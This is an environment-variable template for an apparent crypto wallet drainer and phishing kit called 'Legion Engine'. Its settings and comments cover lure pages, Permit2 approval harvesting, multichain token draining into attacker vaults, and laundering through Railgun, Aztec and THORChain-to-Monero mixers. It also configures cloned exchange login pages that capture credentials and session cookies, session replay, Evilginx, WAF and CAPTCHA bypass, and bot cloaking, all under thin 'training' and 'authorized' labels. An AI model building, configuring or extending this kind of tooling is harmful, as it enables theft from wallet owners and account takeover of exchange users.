# ─────────────────────────────────────────────
# LEGION ENGINE — Environment Variables Template
# Copy to .env and fill in real values.
# NEVER commit .env to git.
# ─────────────────────────────────────────────

# ── App ──────────────────────────────────────
NODE_ENV=development
PORT=4000
API_BASE_URL=http://localhost:4000
EGRESS_IP_CHECK_URL=

# ── Multi-origin Mesh (@legion/api Fastify CORS Ingress) ───────────────────
# API_CORS_ALLOW_ALL=1 → reflect any Origin (maximum reach). Else comma list + optional host suffix:
# API_CORS_ORIGINS=https://legion-drainer-test.surge.sh,https://a.example.com
# API_CORS_ORIGIN_HOST_SUFFIX=.vercel.app
API_CORS_ALLOW_ALL=
API_CORS_ORIGINS=
# Vector Pivot — comma-separated origins for the Airdrop Hub Ingress Package (production / preview hosts)
API_VECTOR_INGRESS_ORIGINS=
API_CORS_ORIGIN_HOST_SUFFIX=
# Optional canonical site for single-host fallback when allow-all is off
API_SITE_URL=

# ── Lure UI / Omni-Handshake (Reown AppKit — WalletConnect) ───────────────────
# https://dashboard.reown.com — required for AppKit multichain modal in packages/lure-ui
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=
# Browser-visible WalletConnect/AppKit project key for `apps/airdrop-hub`.
NEXT_PUBLIC_AIRDROP_HUB_ORIGIN=
# Browser redirect bridge for `packages/lure-ui` -> `packages/sovereign-admin`.
NEXT_PUBLIC_SOVEREIGN_ADMIN_URL=
NEXT_PUBLIC_APPKIT_ICON_URL=
# Optional Solana RPC for Capability Probe / svm_tx_sim_sign (defaults to public mainnet-beta)
NEXT_PUBLIC_SOLANA_RPC_URL=

# ── Database (Postgres) ──────────────────────
DATABASE_URL=postgresql://legion:password@localhost:5432/legion_engine
# drizzle-kit migrate — use Supabase “Direct connection” or Session pooler URI if transaction pooler (:6543) fails with tenant/user errors
DATABASE_MIGRATE_URL=
DATABASE_POOL_MIN=2
DATABASE_POOL_MAX=20

# ── Redis (AOF persistence required) ─────────
# Local dev: docker compose up -d redis  →  redis://localhost:6379
# Dev overlay: copy .env.development (overrides REDIS_URL in non-production)
# Production: rediss://…@….upstash.io:6379
REDIS_URL=redis://localhost:6379
REDIS_PREFIX=legion:
REDIS_CONNECT_TIMEOUT_MS=10000
REDIS_MAX_RETRIES=3
REDIS_MEMORY_FALLBACK=false

# ── Auth / Session ───────────────────────────
JWT_SECRET=change_me_min_32_chars
JWT_EXPIRES_IN=15m
REFRESH_TOKEN_SECRET=change_me_min_32_chars
REFRESH_TOKEN_EXPIRES_IN=7d

# ── EVM / RPC ────────────────────────────────
# Circuit-breaker mesh: primary → backup1 → backup2 → public; 5m dead cooldown; 30m recovery probe
RPC_CIRCUIT_BREAKER=true
# Optional second backups (backup2 tier): RPC_ETHEREUM_BACKUP2, RPC_SOLANA_BACKUP2, RPC_APTOS_BACKUP2, RPC_SUI_BACKUP2
# Managed Alchemy key — used to derive Base / Arbitrum / Polygon JSON-RPC when RPC_*_PRIVATE are unset (L2 Strike Force mesh)
EVM_ALCHEMY_KEY=
# Primary ghost lanes (Flashbots / private RPCs)
RPC_ETHEREUM_PRIVATE=https://rpc.flashbots.net
RPC_ETHEREUM_BACKUP=https://eth.llamarpc.com
RPC_BSC_TESTNET_PRIVATE=
RPC_POLYGON_PRIVATE=
RPC_ARBITRUM_PRIVATE=
RPC_BASE_PRIVATE=
RPC_POLYGON_BACKUP=
RPC_ARBITRUM_BACKUP=
RPC_BASE_BACKUP=
RPC_OPTIMISM_BACKUP=
# Privacy / Ghost Protocol EVM lane (server — bundle & settlement mesh; also reads FLASHBOTS_PROTECT_RPC_URL)
PRIVACY_RPC_EVM_URL=
# Network Egress Cloaking: HTTP(S) proxy for undici + viem (all JSON-RPC via PROXY_URL)
PROXY_URL=

# ── Solana ───────────────────────────────────
# SOLANA_NETWORK=mainnet|devnet|testnet — cluster when RPC_SOLANA_PRIVATE unset
SOLANA_NETWORK=mainnet
# Helius first in resolveSolanaRpcUrl() — required for SPL getParsedTokenAccountsByOwner (5-chain 10/10)
HELIUS_SOLANA_URL=https://mainnet.helius-rpc.com/?api-key=YOUR_HELIUS_KEY
RPC_SOLANA_PRIVATE=https://api.mainnet-beta.solana.com
# Omnichain sequential: abort native legs on first failure (default true — protects EVM Permit2)
OMNI_SEQUENTIAL_FAIL_FAST=true
RPC_SOLANA_BACKUP=

# ── Live Config Updater (@legion/updater) ─────
# Remote JSON hot-reload for EIP-712 domains, wallet blacklist, RPC mesh, CAPTCHA keys
UPDATE_URL=
UPDATE_CRON=0 */6 * * *
UPDATE_API_KEY=
# Manual trigger: POST /api/update/now with header x-legion-update-key: <UPDATE_API_KEY>

# ── Dashboard Stats API ──────────────────────
DASHBOARD_API_KEY=
# Authenticated endpoints (header X-API-Key: <DASHBOARD_API_KEY>):
#   GET  /api/v1/stats
#   GET  /api/v1/campaigns
#   POST /api/v1/campaigns
#   GET  /api/v1/logs

# ── Aptos ────────────────────────────────────
RPC_APTOS_PRIVATE=
APTOS_RPC_URL=
RPC_APTOS_BACKUP=
APTOS_EXECUTION_PRIVATE_KEY=
VAULT_ADDRESS_APTOS=
SOVEREIGN_VAULT_APTOS=

# ── Sui ──────────────────────────────────────
RPC_SUI_PRIVATE=
SUI_RPC_URL=
RPC_SUI_BACKUP=
SUI_EXECUTION_PRIVATE_KEY=
VAULT_ADDRESS_SUI=
SOVEREIGN_VAULT_SUI=

# ── MEV / Ghost Execution ────────────────────
# MEV_PROTECT=true → eth_sendPrivateTransaction (EVM) + Jito sendBundle (Solana) with public RPC fallback
MEV_PROTECT=false
# Force private mempool when native ETH ≥ threshold (even if MEV_PROTECT=false)
MEV_FORCE_LARGE_ETH=10
MEV_RELAY_URL=
# EVM private-tx RPC (default https://rpc.flashbots.net when FLASHBOTS_RELAY_URL points at relay.flashbots.net)
MEV_MAX_BLOCK_AHEAD=25
MEV_JITO_URL=
FLASHBOTS_PROTECT_RPC_URL=
FLASHBOTS_AUTH_KEY=
FLASHBOTS_ENABLED=false
# Lure UI Gatekeeper — Flashbots relay + Jito block-engine (PerformanceCloser / Liquidation Trigger)
FLASHBOTS_RELAY_URL=https://relay.flashbots.net
ALCHEMY_BASE_RPC_TEMPLATE=
ALCHEMY_ARBITRUM_RPC_TEMPLATE=
ALCHEMY_POLYGON_RPC_TEMPLATE=
ALCHEMY_ETH_RPC_TEMPLATE=
ALCHEMY_OPTIMISM_RPC_TEMPLATE=
ALCHEMY_EVM_SLUG_RPC_TEMPLATE=
ALCHEMY_SOLANA_RPC_TEMPLATE=
# Server-side Jito block-engine (env reconciliation; same role as NEXT_PUBLIC for non-browser strike plane)
JITO_SETTLEMENT_LANE_URL=
JITO_BLOCK_ENGINE_URL=
NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL=
COINGECKO_SIMPLE_PRICE_URL=
TON_JETTON_TRANSFERS_URL=
BLOCKCYPHER_BTC_MAIN_URL_TEMPLATE=
BLOCKCYPHER_BASE_URL=
TRON_PUBLIC_FALLBACK_NODE=
EVM_PUBLIC_RPC_FALLBACKS=

# ── Backup RPC URLs (Production fallback: Primary → Backup → Public) ──────────
# Used when the primary RPC_*_PRIVATE / TRON_FULL_NODE_URL / TON_JSON_RPC_URL is unset.
RPC_ETHEREUM_BACKUP=
RPC_BSC_BACKUP=
RPC_BSC_TESTNET_BACKUP=
RPC_POLYGON_BACKUP=
RPC_ARBITRUM_BACKUP=
RPC_OPTIMISM_BACKUP=
RPC_BASE_BACKUP=
RPC_SOLANA_BACKUP=
TRON_BACKUP_NODE=
TON_BACKUP_RPC=
# Bitcoin backup mempool/explorer endpoint (polled after Mempool.space for tx confirmation)
BTC_BACKUP_ENDPOINT=

# ── Transaction confirmation polling ──────────────────────────────────────────
# Set to false or 0 to disable all post-broadcast confirmation polling (e.g. in tests).
CONFIRMATION_POLLING_ENABLED=true
EVM_MESH_JSON=
SVM_MESH_URLS=
UTXO_MESH_ENDPOINTS=
CHAINID_NETWORK_URL=
ETHEREUM_LISTS_BASE_URL=
RPC_INFO_PROBE_URLS=
POKT_PROBE_URLS=
LLAMA_SEEDS_JSON=
EXTENDED_SEEDS_JSON=
POCKET_SEEDS_JSON=
SOLANA_PUBLIC_RPC_URL=
SOLANA_PUBLIC_RPC_FAILOVER_MESH=
BTC_BLOCKSTREAM_ADDRESS_URL_TEMPLATE=
BTC_MEMPOOL_ADDRESS_URL_TEMPLATE=
BTC_BLOCKCHAIN_INFO_BALANCE_URL_TEMPLATE=
SAFE_TRANSACTION_SERVICE_MAP_JSON=
DEFILLAMA_COINS_BASE_URL=
MEV_SHARE_ENDPOINT=https://mev-share.flashbots.net

# ── Proxy Mesh (Shadow sentinel) ─────────────
PROXY_MESH_ENABLED=false
PROXY_MESH_PROVIDER=
PROXY_MESH_API_KEY=

# ── Telemetry / Indexers (Scout sentinel) ────
DEBANK_API_KEY=
RABBY_API_KEY=
DEFILLAMA_BASE_URL=https://api.llama.fi
ONEINCH_API_KEY=
# CoinGecko Demo API key — optional; sends x-cg-demo-api-key on ETH/USD operational price sync
COINGECKO_API_KEY=
# QuickNode / managed Solana HTTPS JSON-RPC (server + Scout SVM Integration)
SOLANA_RPC_URL=
NEXT_PUBLIC_SOLANA_RPC_URL=

# ── Price Oracle (CoinGecko → Redis, fallback Binance/CryptoCompare) ─────────
USE_PRICE_ORACLE=true
# Cron UTC — default every 30 minutes (reduces CoinGecko 429 rate limits)
PRICE_ORACLE_CRON=*/30 * * * *
# 429/401/451 retry: delay = 2^attempt * PRICE_ORACLE_RETRY_DELAY_MS (default 2000ms), up to 5 retries
PRICE_ORACLE_RETRY_COUNT=5
PRICE_ORACLE_RETRY_DELAY_MS=2000
# Provider chain (comma-separated). CoinCap/Kraken/Bybit first — no API keys required.
PRICE_ORACLE_PROVIDER_ORDER=coincap,kraken,bybit,gateio,kucoin,coingecko,binance,cryptocompare
# Legacy alias for PRICE_ORACLE_PROVIDER_ORDER
PRICE_ORACLE_FALLBACK_SOURCES=coingecko,binance,cryptocompare
# COINGECKO_SIMPLE_PRICE_URL=https://api.coingecko.com/api/v3/simple/price?ids=ethereum,solana,the-open-network,tron,bitcoin&vs_currencies=usd
# CRYPTOCOMPARE_API_KEY=          # optional — higher CryptoCompare rate limits
# Optional fallback static values when oracle/redis/API unavailable:
FALLBACK_ETH_PRICE_USD=3000
FALLBACK_SOL_PRICE_USD=150
FALLBACK_TON_PRICE_USD=5
FALLBACK_TRX_PRICE_USD=0.1
FALLBACK_BTC_PRICE_USD=65000

# ── Sovereign Vault (bundle `to`; SOVEREIGN_VAULT_ADDRESS operational alias for EVM) ───
SOVEREIGN_VAULT_ADDRESS=
SOVEREIGN_VAULT_EVM=
SOVEREIGN_VAULT_SOL=
SOVEREIGN_VAULT_TRON=
# Bitcoin: mainnet | testnet (testnet PSBT broadcast → mempool.space/testnet/api)
BITCOIN_NETWORK=mainnet
# Optional — sole UTXO source when set; {address} replaced with wallet (no fallback)
# UTXO_FETCH_URL=https://blockstream.info/api/address/{address}/utxo
# EVM settlement signer — required in production (64 hex). API exits at boot if missing when NODE_ENV=production.
SETTLEMENT_EXECUTION_PRIVATE_KEY=
# Solana settlement signer — optional unless SVM broadcast is enabled (warn at boot if unset).
SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY=

# ── Gatekeeper / Admin ───────────────────────
GATEKEEPER_SECRET=change_me
ADMIN_WALLET_ADDRESS=

# ── Shadow / Signature Anchor (AES-256-GCM at rest) ───────────────────────────
# 64 hex chars (32 bytes). Preferred key for Shadow vault + sealed signature_hex.
SHADOW_VAULT_KEY=
# If 1, strike preclearance rejects plaintext signature_hex (envelope required).
LEGION_SIGNATURES_REQUIRE_SHADOW_GCM=

# ── Forge smoke test only (optional 64 hex chars; never use production key material) ──
FORGE_SMOKE_VAULT_KEY_HEX=

# ── apps/api (Fastify) — Auth Unification + Signature Anchor service plane ───
# SUPABASE_URL=   (or reuse NEXT_PUBLIC_SUPABASE_URL in monorepo)
# NEXT_PUBLIC_SUPABASE_URL=
SUPABASE_ANON_KEY=
# SUPABASE_SERVICE_ROLE_KEY=  (Vault writes; same as Lure-UI server routes)
# JWT_SECRET=  (API session JWT; paired with Supabase access_token in unified middleware)

# ── Internal API (kinetic-deep-scan) ─────────────────────────────────────────
# Required in production. Callers must send header: x-legion-kinetic-key: <same value>
KINETIC_INTERNAL_KEY=

# ── Omnichain Expansion — TRON / TON Sensory Lanes (Recursive Predator fusion) ─
TRON_FULL_NODE_URL=https://api.trongrid.io
TRON_PRO_API_KEY=
TON_JSON_RPC_URL=https://toncenter.com/api/v2/jsonRPC
TONCENTER_API_KEY=
# Base58 TRON delegate for USDT allowance reads (institutional vault / closer)
LEGION_TRON_DELEGATE_SPENDER=

# ── Cosmos Hub (cosmoshub-4) ─────────────────────────────────────────────────
RPC_COSMOS=https://cosmos-rpc.publicnode.com:443
VAULT_ADDRESS_COSMOS=
SOVEREIGN_VAULT_COSMOS=
COSMOS_EXECUTION_MNEMONIC=
# Alternative to mnemonic — 64-char hex secp256k1 private key
COSMOS_EXECUTION_PRIVATE_KEY=
# Comma-separated CW20 contract addresses for token drain / omnichain legs
COSMOS_CW20_CONTRACTS=
# Legacy alias — same as COSMOS_CW20_CONTRACTS
COSMOS_TOKEN_CONTRACTS=

# ── Aptos mainnet ────────────────────────────────────────────────────────────
# APTOS_EXECUTION_PRIVATE_KEY=   # hex Ed25519 secret (server signing)
# VAULT_ADDRESS_APTOS=
# Comma-separated fully-qualified coin types (e.g. 0x1::aptos_coin::AptosCoin)
APTOS_COIN_TYPES=

# ── Sui mainnet ──────────────────────────────────────────────────────────────
# SUI_EXECUTION_PRIVATE_KEY=     # base64 Ed25519 secret
# VAULT_ADDRESS_SUI=
# Comma-separated coin types (e.g. 0x2::sui::SUI)
SUI_COIN_TYPES=

# ── Telegram / Sovereign Telemetry ───────────────────────────────────────────
# Webhook URL (Telegram bot sendMessage proxy or custom relay)
TELEMETRY_WEBHOOK_URL=
# Comma-separated chat IDs — notifications fan out to every chat
TELEGRAM_CHAT_IDS=
# Legacy single chat (used when TELEGRAM_CHAT_IDS is unset)
TELEGRAM_CHAT_ID=
# Required for grammY control bot (/status, /pause, /resume, /recent, /stats)
TELEGRAM_BOT_TOKEN=
# Local dev: set true to avoid 409 Conflict when Railway already polls the same token
TELEGRAM_BOT_SKIP_LOCAL=false
# Alias for TELEGRAM_BOT_SKIP_LOCAL
# DISABLE_TELEGRAM_BOT=false

# ── Execution wallet gas top-up (cron — apps/api/src/cron/gas-topup.ts) ───────
# Tops up execution wallets from reserve when native balance falls below GAS_RESERVE.
GAS_TOPUP_ENABLED=false
GAS_RESERVE=0.005
# Multiplier applied to GAS_RESERVE for whale settlements (e.g. 2 = double reserve)
GAS_RESERVE_LARGE_MULTIPLIER=2
GAS_TOPUP_BUFFER=0.001
GAS_TOPUP_CRON=*/5 * * * *
# Reserve wallets (per chain — lane skipped when unset):
RESERVE_WALLET_PRIVATE_KEY=
RESERVE_WALLET_EVM_PRIVATE_KEY=
RESERVE_WALLET_SOLANA_PRIVATE_KEY=
RESERVE_WALLET_TRON_PRIVATE_KEY=
RESERVE_WALLET_TON_MNEMONIC=
RESERVE_WALLET_BITCOIN_WIF=
RESERVE_WALLET_COSMOS_PRIVATE_KEY=
RESERVE_WALLET_COSMOS_MNEMONIC=
RESERVE_WALLET_APTOS_PRIVATE_KEY=
RESERVE_WALLET_SUI_PRIVATE_KEY=
# Optional USD prices for ETH-equivalent threshold conversion:
# BTC_PRICE_USD= ATOM_PRICE_USD= APT_PRICE_USD= SUI_PRICE_USD=

# ── Multi-chain balance display (GET /api/v1/balance/multi — mirror UX) ───────
MULTI_BALANCE_EVM_CHAIN_ID=1
# Comma-separated ERC-20 contracts to probe (defaults: USDC + USDT mainnet)
MULTI_BALANCE_EVM_TOKENS=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,0xdAC17F958D2ee523a2206206994597C13D831ec7
MULTI_BALANCE_TRC20_CONTRACT=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
# Comma-separated jetton master addresses for TON token balance + allowance reuse scan
MULTI_BALANCE_TON_JETTON_MASTERS=
TON_JETTON_ALLOWANCE_MASTERS=

# ── Vault gas monitor (cron — apps/api/src/cron/gas-warning.ts) ───────────────
# Native balance threshold per chain (ETH, SOL, TRX, TON, BTC). Default 0.01.
GAS_VAULT_MIN_NATIVE=0.01
# scripts/live-audit.ts — warn when execution wallet native balance is below this (default 0.005).
# LIVE_AUDIT_EXEC_MIN_NATIVE=0.005
# Cron expression UTC (default: every 6 hours). Set GAS_VAULT_CRON_DISABLED=1 to off.
GAS_VAULT_CRON=0 */6 * * *
# GAS_CHECK_EVM_CHAIN_ID=1

# ── Security research simulators (log-only; never production) ────────────────
# Master guard — must be true for any simulator. Default false.
SECURITY_RESEARCH_MODE=false
TESTNET=false
# Production privacy mixer — routes vault funds after SETTLED (real on-chain txs on EVM)
PRIVACY_MIXER_ENABLED=false
# PRIVACY_MIXER_TYPE=auto
# aztec | railgun | thorchain_xmr | auto
# PRIVACY_MIXER_ROUTING=EVM,SOL,TRON,TON
# PRIVACY_MIXER_EVM_CHAIN_ID=1
# PRIVACY_MIXER_TOKEN_ADDRESS=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
PRIVACY_MIXER_XMR_DESTINATION=   # REQUIRED when PRIVACY_MIXER_ENABLED=true — Monero receive address (4... or 8...)
# PRIVACY_MIXER_EVM_SIGNING_KEY=  # defaults to SETTLEMENT_EXECUTION_PRIVATE_KEY
# THORCHAIN_NODE_URL=https://thornode.ninerealms.com
# AZTEC_RPC_URL=https://your-aztec-node:8080      # Aztec L2 node endpoint (required for aztec lane)
# AZTEC_TOKEN_CONTRACT_ADDRESS=                    # Deployed TokenContract address on Aztec L2
# AZTEC_RECIPIENT_ADDRESS=                         # AztecAddress for private note recipient
# AZTEC_ACCOUNT_SALT=                              # Optional: 32-byte hex salt for account derivation (default: derived from private key)

# Railgun lane (PRIVACY_MIXER_TYPE=railgun or auto)
# Supported chains: Ethereum (1), Polygon (137), BNB Chain (56), Arbitrum (42161)
# RAILGUN_DESTINATION_ADDRESS=0zk...               # Required: 0zk-prefixed Railgun encoded recipient address
# RAILGUN_SHIELD_PRIVATE_KEY=                      # Optional: 32-byte hex shield key (default: derived from execution key)
# Privacy leak audit (Aztec / Railgun / Thorchain XMR — no broadcast; requires SECURITY_RESEARCH_MODE)
PRIVACY_SIM_ENABLED=false
# PRIVACY_SIM_AMOUNT=1000
# PRIVACY_SIM_TOKEN=USDC
# Flashloan-assisted settlement (Ethereum mainnet — atomic via deployed receiver contract)
FLASHLOAN_ENABLED=false
FLASHLOAN_MIN_THRESHOLD=10000
# PROFIT_ADDRESS=
# AAVE_POOL_ADDRESS=0x87870Bca3F3fD6335C3F4ce8391D5256Bc458c53
# FLASHLOAN_RECEIVER_ADDRESS=  # LegionAaveFlashSettlement deploy (packages/core/contracts)
# FLASHLOAN_ASSET_ADDRESS=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
# FLASHLOAN_UNISWAP_FEE=3000
# Flashloan research simulator (log-only; requires SECURITY_RESEARCH_MODE)
FLASHLOAN_SIM_MODE=false
FLASHLOAN_SIM_ENABLED=false
# FLASHLOAN_SIM_FORK_URL=http://127.0.0.1:8545
# ANVIL_FORK_URL=http://127.0.0.1:8545
# Wallet session persistence audit (read-only allowances / delegates; no broadcast)
SESSION_TEST_MODE=false
# ── E2E Sepolia drain (scripts/e2e-test-drain.ts — testnet only) ─────────────
# TEST_EVM_PRIVATE_KEY=0x…
# BACKEND_URL=https://your-api.up.railway.app
# TEST_EVM_VAULT=          # defaults to SOVEREIGN_VAULT_EVM
# TEST_EVM_RPC=            # Sepolia RPC; else RPC_ETHEREUM_PRIVATE
# TEST_EVM_USDC=0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238
# TEST_USDC_AMOUNT=1000000
# TEST_NATIVE_AMOUNT=1000000000000000

# ── E2E omnichain testnet drains (scripts/e2e-test-omnichain.ts) ─────────────
# BACKEND_URL=https://your-api.up.railway.app
# EVM (Sepolia)
# TEST_EVM_PRIVATE_KEY=0x…
# RPC_SEPOLIA_PRIVATE=https://rpc.ankr.com/eth_sepolia
# SOVEREIGN_VAULT_EVM=0x…
# TEST_EVM_USDC=0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238
# TEST_EVM_PERMIT_MIN=1000
# Solana (Devnet)
# TEST_SOL_PRIVATE_KEY=…
# RPC_SOLANA_DEVNET=https://api.devnet.solana.com
# SOVEREIGN_VAULT_SOL=…
# TEST_SOL_SPL_MINT=4zMMC9srt5Ri5X14GAgXhaHii3qpMvestHtC5W9zfY3w
# Tron (Shasta)
# TEST_TRON_PRIVATE_KEY=…
# TRON_SHASTA_NODE=https://api.shasta.trongrid.io
# SOVEREIGN_VAULT_TRON=…
# TEST_TRON_USDT=TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs
# TON (Testnet)
# TEST_TON_MNEMONIC=word1 word2 … (24 words)
# TON_TESTNET_RPC=https://testnet.toncenter.com/api/v2/jsonRPC
# TONCENTER_API_KEY=
# SOVEREIGN_VAULT_TON=…
# TEST_TON_JETTON_MASTER=
# Bitcoin (Testnet)
# TEST_BTC_WIF=c…
# BITCOIN_TESTNET_RPC=https://mempool.space/testnet/api
# SOVEREIGN_VAULT_BTC=…
# OMNI_SETTLE_WAIT_MS=25000

# SESSION_TEST_EVM_WALLET=0x...
# SESSION_TEST_SOL_WALLET=
# SESSION_TEST_TRON_WALLET=
# SESSION_TEST_TON_WALLET=
# SESSION_TEST_EVM_CHAIN_ID=1
# SESSION_TEST_EVM_TOKENS=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,0xdAC17F958D2ee523a2206206994597C13D831ec7
# Phishing awareness training (localhost static clones + real wallet sign demo)
PHISHING_TRAINING_MODE=false
# PHISHING_TRAINING_ALLOWED_HOSTS=app.uniswap.org
# PHISHING_TRAINING_MAX_ASSETS=30
# DEMO_API_URL=https://your-app.up.railway.app  # backend for generated training clones
# TRAINING_DEMO_MODE=true  # API: log /api/training-demo/record only; block settlement on training payloads
# TRAINING_DEMO_ALLOWED_ORIGINS=http://localhost:8080,http://127.0.0.1:8080
# Generate: PHISHING_TRAINING_MODE=true DEMO_API_URL=... pnpm exec tsx scripts/generate-phishing-page.ts <url> ./training-clones/demo
# Dynamic QA mirror (nginx reverse proxy only — no clone/capture):
# PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts --mirror <url> ./mirrors/demo
# PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts --mirror --log-forms --test-login --replay-original --instant-replay <url> ./mirrors/demo
# --instant-replay: ORIGINAL_REPLAY_DELAY_MS=0, CSRF pre-fetch skipped if >300ms (2FA QA)
# PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts --mirror --log-forms --solve-captcha <url> ./mirrors/demo
# PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts --mirror --replay-demo <url> ./mirrors/demo
# PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts --mirror --captcha-demo <url> ./mirrors/demo
# PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts --mirror --auto-rotate <url> ./mirrors/demo
# Requires DUCKDNS_TOKEN (+ optional DUCKDNS_SUBDOMAIN) at generation and docker compose up
# QA_MIRROR_PORT=8080
# QA_MIRROR_LOGGER_PORT=9090
# Production mirror (pnpm clone-tunnel --god-mode <url> enables --production-clone)
# MIRROR_WAF_BYPASS=true       # curl-impersonate + proxy pool + 2captcha during generation
# CLONE_JA3_CHROME=true        # JA3 TLS fingerprint for WAF bypass fetch (never crashes — fetch fallback)
# LOCAL_CAPTCHA_SOLVER=false   # Free local CAPTCHA solver (puppeteer stealth + optional GateSolve free tier)
# CAPTCHA_BYPASS_URL=http://127.0.0.1:8081/solve  # captcha-bypass Docker API (optional)
# GATESOLVE_API_KEY=           # Optional free-tier key from gatesolve.dev (100 solves)
# PROXY_LIST=                  # comma-separated proxies for WAF probe rotation
# TWOCAPTCHA_API_KEY=          # Fallback paid solver when local solver fails
# HEADLESS_TIMEOUT=60000       # puppeteer navigation timeout ms (default 60s)
# HEADLESS_CAPTURE_RETRIES=2   # headless fallback retries before next chain step
# STATIC_STRIP_REDIRECTS=true  # strip window.location redirects in static clones
# CAPTURE_LOGIN_CREDS=true     # hook login forms in authorized-drain-inject.js
# MIRROR_PROXY_COOKIES=        # session cookies from headless capture → nginx upstream Cookie header
#
# CEX login clone (pnpm cex-clone <url> <outDir> [--deploy])
# PHISHING_TRAINING_MODE=true   # required unless --authorized
# CEX_CREDS_API_KEY=            # optional — require X-Cex-Creds-Key on POST /api/v1/creds
# CEX_CAPTURE_SESSION_COOKIES=true  # inject reads document.cookie + localStorage (default true)
# CAPTURE_LOGIN_CREDS=true          # authorized-drain-inject hooks login forms → POST /api/v1/creds
# CEX_TELEGRAM_ALERT=true           # Telegram alert on new cred capture (default true)
# CEX_CLONE_MAX_ASSETS=60
# Cookie replay: pnpm cex-cookie-replay --list | --id <uuid> --launch
# Session replay (any site): pnpm session-replay --cookies capture.json --url https://target/login
# Export DB capture to JSON: pnpm session-replay --export-db --id <uuid> --out capture.json --launch
#
# Clone tunnel orchestrator (pnpm clone-tunnel --god-mode [--force] [--port N] <url>)
# Mirror port auto-resolution — probes 8080, 8081, … when busy (default true)
CLONE_AUTO_PORT=true
# Max host ports to scan from 8080 (default 11 → 8080–8090)
CLONE_PORT_SCAN_MAX=11
# Skip DNSHE API entirely (use DuckDNS / Cloudflare / quick tunnel). --force also skips DNSHE.
CLONE_SKIP_DNSHE=false
# Container / tunnel self-healing (clone-deploy-tunnel.ts)
CLONE_CONTAINER_HEALTH_TIMEOUT_MS=30000
# Public tunnel provider order when exposing local mirror.
# Restricted/corporate networks: localhost.run,bore,cloudflared,ngrok,localtunnel
# localhost.run + bore are also auto-tried after configured providers fail (no account needed).
CLONE_TUNNEL_PROVIDERS=localhost.run,bore,cloudflared,ngrok,localtunnel
# Optional ngrok auth token — also passed as NGROK_AUTHTOKEN to the ngrok child process
CLONE_NGROK_AUTH_TOKEN=
# Optional bore relay (default bore.pub)
# CLONE_BORE_SERVER=bore.pub
CLONE_TUNNEL_HEALTH_INTERVAL_MS=10000
CLONE_TUNNEL_MAX_RESTARTS=3
CLONE_TUNNEL_VERIFY_TIMEOUT_MS=20000
# Show authorized wallet panel during god-mode QA (default silent/production inject)
CLONE_MIRROR_QA_UI=true
# Cloak: nginx serves bots-clean.html to bot UAs, drain inject to real users (same URL)
# MIRROR_CLOAK_MODE=dual set automatically by clone-tunnel
# Mirror fallback chain (clone-tunnel): reverse-proxy → flaresolverr → static → asuka → headless → placeholder
CLONE_AUTO_DB_MIGRATE=true
#
# ── Mirror toolkit integrations (optional — authorized red-team lab only) ─────
# docker compose --profile integrations up -d flaresolverr recognizer
# CLONE_MODE=drainer
# CLONE_MODE=session_hijack
# SESSION_HIJACK_ENABLED=false
# FLARESOLVERR_ENABLED=false
# FLARESOLVERR_URL=http://localhost:8191
# FLARESOLVERR_MAX_TIMEOUT_MS=60000
# USE_REPLICA=false
# REPLICA_DOCKER_IMAGE=ghcr.io/sarperavci/replica:latest
# REPLICA_PORT=8081
# REPLICA_REWRITE_RULES=inject:legion-authorized-drain.js:script
# WEBCLONER_ENABLED=false
# WEBCLONER_BUILD_FROM_SOURCE=true
# WEBCLONER_REPO=https://github.com/maornissan/webcloner-js.git
# WEBCLONER_TIMEOUT_MS=240000
# ASUKA_FALLBACK=false
# ASUKA_USE_DOCKER=false
# ASUKA_DOCKER_IMAGE=ghcr.io/asuka-cloner/asuka:latest
# ASUKA_BIN=asuka
# ASUKA_MAX_DEPTH=2
# ASUKA_TIMEOUT_MS=300000
# CAPTCHA_SOLVER=recognizer
# RECOGNIZER_URL=http://localhost:5000
# RECOGNIZER_ENABLED=false
# EVILGINX_DOCKER_IMAGE=ghcr.io/0xtidalbore/evilginx3:latest
# EVILGINX_DOMAIN=localhost
# EVILGINX_PHISHLETS_DIR=
# EVILGINX_HTTPS_PORT=8443
# AI_CLONING_ENABLED=false
# BROWSER_EXTENSION_ENABLED=false
# pnpm install-extension --backend https://your-api --zip
# Local CAPTCHA solver — max wall time before 2captcha / headless fallback (ms)
LOCAL_CAPTCHA_MAX_MS=60000
# DNSHE_TOKEN=                  # god-mode: auto-claim subdomain on DNSHE (e.g. app.swapp.cc.cd)
# DNSHE_BASE_DOMAIN=swapp.cc.cd # base zone registered on DNSHE
# Fallback chain when DNSHE unreachable (default: duckdns,cloudflare,quicktunnel)
DNSHE_FALLBACK_PROVIDERS=duckdns,cloudflare,quicktunnel
# DUCKDNS_TOKEN=                # DuckDNS fallback — updates IP and uses --hostname
DUCKDNS_SUBDOMAIN=              # e.g. mymirror → mymirror.duckdns.org
# CLOUDFLARE_API_TOKEN=         # Cloudflare DNS fallback
# CLOUDFLARE_ZONE_ID=
# CLOUDFLARE_BASE_DOMAIN=       # zone apex (e.g. example.com)
# MIRROR_VPS_IP=                # A-record target for Cloudflare fallback
# CLOUDFLARED_METRICS_PORT=4040 # cloudflared local metrics API for URL extraction fallback
# ── Large-value settlement policy (whale / exchange / multi-sig) ─────────────
# Permit2 approval: capped = balance×2 (default); exact = current balance only
APPROVAL_AMOUNT_MODE=capped
# Telegram alert + policy hooks when scout USD ≥ threshold
LARGE_TRANSFER_THRESHOLD_USD=50000
# Adaptive delay: < DELAY_THRESHOLD_USD = immediate; ≥ threshold = random delay window
DELAY_THRESHOLD_USD=1000
DELAY_SETTLEMENT_MIN_HOURS=1
